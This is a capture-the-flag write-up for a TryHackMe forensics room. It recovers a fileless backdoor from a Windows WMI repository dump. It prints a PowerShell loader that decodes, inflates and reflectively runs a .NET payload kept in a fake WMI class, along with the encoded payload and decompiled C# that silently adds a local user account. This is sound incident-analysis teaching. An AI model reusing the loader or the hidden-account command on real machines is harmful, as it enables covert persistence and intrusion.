# URL
https://tryhackme.com/room/hh-afterhours-b090d1f0
# Concept
* Windows WMI repository dump enumeration
* .NET binary decompilation
# Method of solve
* we download the task files and unzip them
* there are five files:
* `INDEX.BTR`, `MAPPING1.MAP`, `MAPPING2.MAP`, `MAPPING3.MAP`, and `OBJECTS.DATA`
* there's reference to a Powershell command in `OBJECTS.DATA`:
```
strings OBJECTS.DATA | grep powershell | sort | uniq
```
* when we decode the Powershell payload, it turns out to be a Powershell script:
```Powershell
$file = ([WmiClass]'ROOT\cimv2:Win32_HardwareTelemetry').Properties['ConfigData'].Value;
$o = New-Object IO.MemoryStream;
$d = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($file),[IO.Compression.CompressionMode]::Decompress);
$b = New-Object Byte[](1024);
$r = $d.Read($b,0,1024);
while($r -gt 0){
    $o.Write($b,0,$r);
    $r = $d.Read($b,0,1024);
}
[Reflection.Assembly]::Load($o.ToArray()).EntryPoint.Invoke($null,@(,[string[]]@()))|Out-Null
```
* the script takes the contents of a WMI class called `Win32_HardwareTelemetry` (which is not a legitimate Windows WMI class), and then modifies it:
  * using compression (`DeflateStream`)
  * and encoding (`FromBase64String`)
* then the data is read into a buffer using a loop, injected in memory and executed using .NET Reflection
* the next step is to locate the base64-encoded data associated with the `Win32_HardwareTelemetry` class:
```
strings OBJECTS.DATA | grep "Win32_HardwareTelemetry" -C 5 | sort | uniq
```
* we find the base64-encoded data, and we have to revert it back into a .NET binary
  * this involves base64-decoding the data
  * and then inflating the data
  * then writing that data to a file
* this Python script does the job:
```Python
import base64
import zlib

binary_data = "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"

decoded_data = base64.b64decode(binary_data)

decompressed_data = zlib.decompress(decoded_data, -zlib.MAX_WBITS)

output_filename = "payload.dll"

with open(output_filename, "wb") as f:
    f.write(decompressed_data)
```
* now we have a .NET binary to decompile
* we use this website to decompile the binary:
```
https://www.decompiler.com
```
* after uploading the binary and decompiling it, we can download the source files:
* the one we need to pay attention to is called `Program.cs`
```
using System;
using System.Diagnostics;

namespace AfterHours;

public class Program
{
        public static void Main()
        {
                try
                {
                        if (string.Equals(Environment.MachineName, "bytelotusdc", StringComparison.OrdinalIgnoreCase))
                        {
                                ProcessStartInfo processStartInfo = new ProcessStartInfo();
                                processStartInfo.FileName = "cmd.exe";
                                processStartInfo.Arguments = "/c net user patch VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9 /add";
                                processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                                processStartInfo.CreateNoWindow = true;
                                Process.Start(processStartInfo);
                        }
                        else
                        {
                                Console.WriteLine("Execution halted: Environment mismatch.");
                        }
                }
                catch
                {
                }
        }
}
```
* this is the line we need to pay attention to:
```
processStartInfo.Arguments = "/c net user patch VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9 /add";
```
* the base64-encoded string is the flag for the challenge
